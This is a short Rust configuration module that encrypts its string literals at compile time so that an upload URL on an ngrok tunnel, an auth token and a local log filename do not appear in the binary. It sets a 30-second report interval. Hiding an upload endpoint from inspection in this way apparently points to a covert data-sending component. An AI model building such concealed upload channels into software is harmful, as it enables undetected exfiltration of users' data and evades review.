//! Application configuration
//!
//! Strings are encrypted at compile time via the `cryptify` crate.
//! No sensitive literal appears in the compiled binary; each value is
//! XOR-decrypted in RAM only when the function is first called.

use cryptify::encrypt_string;
use std::time::Duration;

/// Returns the remote telemetry endpoint URL (decrypted at runtime).
pub fn telemetry_url() -> String {
    encrypt_string!("https://ethnographical-olympia-nonharmoniously.ngrok-free.dev/upload")
}

/// Returns the authorisation token (decrypted at runtime).
pub fn auth_token() -> String {
    encrypt_string!("super-secret-sandbox-key-2026")
}

/// Returns the local diagnostics log filename (decrypted at runtime).
pub fn diagnostics_log() -> String {
    encrypt_string!("diagnostics.log")
}

/// How often the reporter flushes its buffer.
pub const REPORT_INTERVAL: Duration = Duration::from_secs(30);
